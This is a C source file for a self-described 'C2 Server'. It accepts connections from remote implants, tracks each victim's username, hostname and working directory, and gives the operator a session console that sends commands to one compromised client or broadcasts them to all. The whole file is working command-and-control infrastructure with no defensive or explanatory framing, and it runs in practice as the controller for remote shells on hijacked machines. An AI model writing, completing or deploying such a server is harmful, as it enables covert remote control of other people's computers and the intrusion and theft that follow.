#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <time.h>
#include <signal.h>

#include "protocol.h"

typedef struct {
    int               fd;
    struct sockaddr_in addr;
    uint8_t           rbuf[BUF_SIZE];
    int               rlen;
    uint8_t           wbuf[BUF_SIZE];
    int               wlen;
    time_t            last_beat;
    char              hostname[64];
    char              username[64];
    char              cwd[256];
} Client;

static Client       clients[MAX_CLIENTS];
static int          nclients       = 0;
static int          srv_fd;
static volatile int running        = 1;
static int          current_client = -1;

static void print_prompt(void);

static void sigint_handler(int sig) {
    (void)sig;
    running = 0;
}

static int find_free_slot(void) {
    for (int i = 0; i < MAX_CLIENTS; i++)
        if (clients[i].fd <= 0)
            return i;
    return -1;
}

static void remove_client(int idx) {
    if (idx < 0 || idx >= MAX_CLIENTS || clients[idx].fd <= 0)
        return;

    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clients[idx].addr.sin_addr, ip, sizeof(ip));
    printf("[-] Client disconnected: %s:%d  [%d remaining]\n",
           ip, ntohs(clients[idx].addr.sin_port), nclients - 1);

    close(clients[idx].fd);
    memset(&clients[idx], 0, sizeof(Client));
    nclients--;
}

static void list_clients(void) {
    printf("[*] %d active client(s):\n", nclients);

    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].fd <= 0) continue;

        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clients[i].addr.sin_addr, ip, sizeof(ip));

        printf("  [%d] %s@%s  (%s)\n",
               i,
               clients[i].username[0] ? clients[i].username : "?",
               clients[i].hostname[0] ? clients[i].hostname : ip,
               clients[i].cwd[0] ? clients[i].cwd : "?");
    }
}

static void broadcast(const uint8_t *data, int dlen) {
    uint8_t packed[HEADER_LEN + MAX_MSG_SIZE];
    int plen = pack_msg(data, dlen, packed);
    if (plen < 0) return;

    time_t now = time(NULL);

    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].fd <= 0) continue;

        if (now - clients[i].last_beat > HEARTBEAT_INT * 3) {
            printf("[!] Zombie client ejected: fd=%d\n", clients[i].fd);
            remove_client(i);
            continue;
        }

        if (clients[i].wlen + plen < BUF_SIZE) {
            memcpy(clients[i].wbuf + clients[i].wlen, packed, plen);
            clients[i].wlen += plen;
        }
    }
}

static void send_to_client(int idx, const uint8_t *data, int dlen) {
    if (idx < 0 || idx >= MAX_CLIENTS) return;
    Client *c = &clients[idx];
    if (c->fd <= 0) return;

    uint8_t packed[HEADER_LEN + MAX_MSG_SIZE];
    int plen = pack_msg(data, dlen, packed);
    if (plen < 0) return;
    if (c->wlen + plen >= BUF_SIZE) return;

    memcpy(c->wbuf + c->wlen, packed, plen);
    c->wlen += plen;
}

static int accept_client(void) {
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);

    int cfd = accept(srv_fd, (struct sockaddr *)&addr, &addrlen);
    if (cfd < 0) return -1;

    int slot = find_free_slot();
    if (slot < 0) {
        close(cfd);
        return -1;
    }

    clients[slot].fd        = cfd;
    clients[slot].addr      = addr;
    clients[slot].rlen      = 0;
    clients[slot].wlen      = 0;
    clients[slot].last_beat = time(NULL);
    nclients++;

    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
    printf("[+] %s:%d connected  [%d active]\n", ip, ntohs(addr.sin_port), nclients);

    return 0;
}

static void handle_client_read(int idx) {
    Client *c = &clients[idx];
    uint8_t buf[65536];

    int n = read(c->fd, buf, sizeof(buf));
    if (n <= 0) {
        remove_client(idx);
        return;
    }

    if (c->rlen + n > BUF_SIZE) c->rlen = 0;
    memcpy(c->rbuf + c->rlen, buf, n);
    c->rlen += n;

    uint8_t msg[MAX_MSG_SIZE];
    int mlen;

    while (1) {
        int consumed = try_unpack(c->rbuf, c->rlen, msg, &mlen);
        if (consumed == 0) break;
        if (consumed < 0) { c->rlen = 0; break; }

        memmove(c->rbuf, c->rbuf + consumed, c->rlen - consumed);
        c->rlen -= consumed;

        if (mlen == 0) {
            c->last_beat = time(NULL);
            continue;
        }

        msg[mlen] = '\0';

        if (strncmp((char *)msg, "INFO|", 5) == 0) {
            char *saveptr;
            strtok_r((char *)msg, "|", &saveptr);
            char *host = strtok_r(NULL, "|", &saveptr);
            char *user = strtok_r(NULL, "|", &saveptr);
            char *cwd  = strtok_r(NULL, "|", &saveptr);

            if (host) strncpy(c->hostname, host, sizeof(c->hostname) - 1);
            if (user) strncpy(c->username, user, sizeof(c->username) - 1);
            if (cwd)  strncpy(c->cwd,      cwd,  sizeof(c->cwd) - 1);

            printf("\n[+] Session %d → %s@%s:%s\n", idx, c->username, c->hostname, c->cwd);
            print_prompt();
            continue;
        }

        printf("\n[← %s:%d] %.*s",
               inet_ntoa(c->addr.sin_addr),
               ntohs(c->addr.sin_port),
               mlen, (char *)msg);
        print_prompt();
        fflush(stdout);
    }
}

static void handle_client_write(int idx) {
    Client *c = &clients[idx];
    if (c->wlen <= 0) return;

    int n = write(c->fd, c->wbuf, c->wlen);
    if (n <= 0) {
        remove_client(idx);
        return;
    }

    if (n < c->wlen)
        memmove(c->wbuf, c->wbuf + n, c->wlen - n);
    c->wlen -= n;
}

static void print_prompt(void) {
    if (current_client < 0 || current_client >= MAX_CLIENTS || clients[current_client].fd <= 0) {
        printf("c2> ");
        fflush(stdout);
        return;
    }

    Client *c = &clients[current_client];
    printf("%s@%s:%s$ ",
           c->username[0] ? c->username : "?",
           c->hostname[0] ? c->hostname : "?",
           c->cwd[0] ? c->cwd : "?");
    fflush(stdout);
}

int main(int argc, char **argv) {
    int port = DEFAULT_PORT;
    if (argc > 1) port = atoi(argv[1]);
    if (port <= 0 || port > 65535) port = DEFAULT_PORT;

    signal(SIGINT, sigint_handler);
    signal(SIGPIPE, SIG_IGN);

    srv_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (srv_fd < 0) { perror("socket"); return 1; }

    int opt = 1;
    setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(srv_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); close(srv_fd); return 1;
    }
    if (listen(srv_fd, 10) < 0) {
        perror("listen"); close(srv_fd); return 1;
    }

    printf("[*] C2 Server listening on 0.0.0.0:%d\n", port);
    print_prompt();

    time_t last_heartbeat = 0;

    while (running) {
        fd_set rfds, wfds;
        FD_ZERO(&rfds);
        FD_ZERO(&wfds);

        FD_SET(srv_fd, &rfds);
        int max_fd = srv_fd;

        for (int i = 0; i < MAX_CLIENTS; i++) {
            if (clients[i].fd <= 0) continue;
            FD_SET(clients[i].fd, &rfds);
            if (clients[i].wlen > 0)
                FD_SET(clients[i].fd, &wfds);
            if (clients[i].fd > max_fd)
                max_fd = clients[i].fd;
        }

        struct timeval tv = {0, 100000};
        if (select(max_fd + 1, &rfds, &wfds, NULL, &tv) < 0) {
            if (errno == EINTR) continue;
            break;
        }

        time_t now = time(NULL);

        if (FD_ISSET(srv_fd, &rfds))
            accept_client();

        for (int i = 0; i < MAX_CLIENTS; i++) {
            if (clients[i].fd <= 0) continue;
            if (FD_ISSET(clients[i].fd, &rfds))
                handle_client_read(i);
            if (clients[i].fd > 0 && FD_ISSET(clients[i].fd, &wfds))
                handle_client_write(i);
        }

        if (now - last_heartbeat >= HEARTBEAT_INT) {
            broadcast(NULL, 0);
            last_heartbeat = now;
        }

        /* Non-blocking stdin */
        fd_set stdin_fds;
        FD_ZERO(&stdin_fds);
        FD_SET(0, &stdin_fds);
        struct timeval stdin_tv = {0, 0};

        if (select(1, &stdin_fds, NULL, NULL, &stdin_tv) > 0) {
            char line[4096];
            if (!fgets(line, sizeof(line), stdin)) break;

            size_t len = strlen(line);
            if (len > 0 && line[len-1] == '\n') line[len-1] = '\0';

            if (strncmp(line, "use ", 4) == 0) {
                int idx = atoi(line + 4);
                if (idx >= 0 && idx < MAX_CLIENTS && clients[idx].fd > 0) {
                    current_client = idx;
                    printf("[*] Active session: %d\n", idx);
                } else {
                    printf("[!] Invalid client\n");
                }
            }
            else if (strcmp(line, "back") == 0) {
                current_client = -1;
            }
            else if (strcmp(line, "exit") == 0) {
                running = 0;
                continue;
            }
            else if (strcmp(line, "list") == 0) {
                list_clients();
            }
            else if (strlen(line) > 0) {
                if (current_client >= 0) {
                    send_to_client(current_client, (uint8_t *)line, strlen(line));
                } else {
                    broadcast((uint8_t *)line, strlen(line));
                    printf("[→ broadcast] %s\n", line);
                }
            }
            print_prompt();
        }
    }

    printf("\n[*] Shutting down server...\n");
    for (int i = 0; i < MAX_CLIENTS; i++)
        if (clients[i].fd > 0)
            close(clients[i].fd);
    close(srv_fd);

    return 0;
}
